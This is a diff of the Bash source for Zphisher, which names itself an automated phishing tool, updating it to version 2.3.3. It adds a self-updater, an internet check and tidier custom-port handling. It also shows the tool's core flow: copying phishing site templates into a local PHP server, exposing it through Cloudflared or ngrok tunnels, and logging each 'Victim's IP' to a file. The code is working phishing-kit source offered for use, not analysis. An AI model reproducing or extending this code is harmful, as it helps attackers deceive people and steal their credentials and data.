@@ -2,7 +2,7 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.2
+##   Version 	: 	2.3.3
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -90,7 +90,11 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.2"
+__version__="2.3.3"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -100,6 +104,8 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -153,6 +159,45 @@ kill_pid() {
 			killall ${process} > /dev/null 2>&1 # Kill the Process
 		fi
 	done
+}
+
+# Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+
+		if [[ -e ".zphisher.tar.gz" ]]; then
+			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .zphisher.tar.gz
+			popd > /dev/null 2>&1
+			{ sleep 3; clear; banner_small; }
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
 ## Banner
@@ -335,7 +380,8 @@ about() {
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
 		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, sepp0, ThelinuxChoice, Yisus7u7
+		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
+		  Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -354,36 +400,28 @@ about() {
 	esac
 }
 
-## Setup website and start php server
-HOST='127.0.0.1'
-#DEFAULT PORT
-PORT='8080' 
-
-#COUSTOM PORT
+## Choose custom port
 cusport() {
-	echo ""
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Coustom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	echo
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
-		printf "\n\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port 1024-9999 : ${WHITE}" CU_P
+		echo -e "\n"
+		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
-			echo ""
+			echo
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-                        { sleep 2; clear; banner; cusport; }
-		fi
-	elif [[ ${P_ANS} =~ ^([Nn])$ ]];then
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port : $PORT...${WHITE}"
-		echo ""
+			{ sleep 2; clear; banner; cusport; }
+		fi		
 	else 
-		echo ""
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${WHITE}"
-		cusport
+		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
+
+## Setup website and start php server
 setup_site() {
-    	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
@@ -392,7 +430,7 @@ setup_site() {
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
@@ -456,8 +494,8 @@ start_ngrok() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-    rm .cld.log > /dev/null 2>&1 &
-        cusport
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
@@ -853,6 +891,7 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
+check_status
 install_ngrok
 install_cloudflared
 install_localxpose
